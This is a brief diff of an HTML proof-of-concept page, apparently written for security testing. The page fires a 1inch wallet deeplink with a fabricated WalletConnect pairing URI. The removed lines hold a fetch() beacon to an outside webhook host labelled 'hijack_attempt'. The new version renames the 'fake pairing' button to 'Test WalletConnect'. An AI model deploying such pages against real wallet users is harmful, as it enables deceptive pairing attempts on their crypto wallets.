@@ -1,13 +1,11 @@
 <!DOCTYPE html>
 <html>
 <body>
-<button onclick="pair()">Pairing Palsu</button>
+<button onclick="pair()">Test WalletConnect</button>
 <script>
 function pair(){
-  // Ini URI WalletConnect palsu, tapi formatnya asli
-  let fakeURI = "wc:1234567890abcdef@2?relay-protocol=irn&symKey=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=";
-  location.href = "1inch://wc?uri=" + encodeURIComponent(fakeURI);
-  fetch('https://webhooksite.net/9782dc22-d216-43c9-a513-905aa2d97d00?wc=hijack_attempt');
+  // Ini langsung panggil deeplink 1inch, bukan lewat https
+  window.location.href = "1inch://wc?uri=" + encodeURIComponent("wc:1234567890abcdef@2?relay-protocol=irn&symKey=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=");
 }
 </script>
 </body>
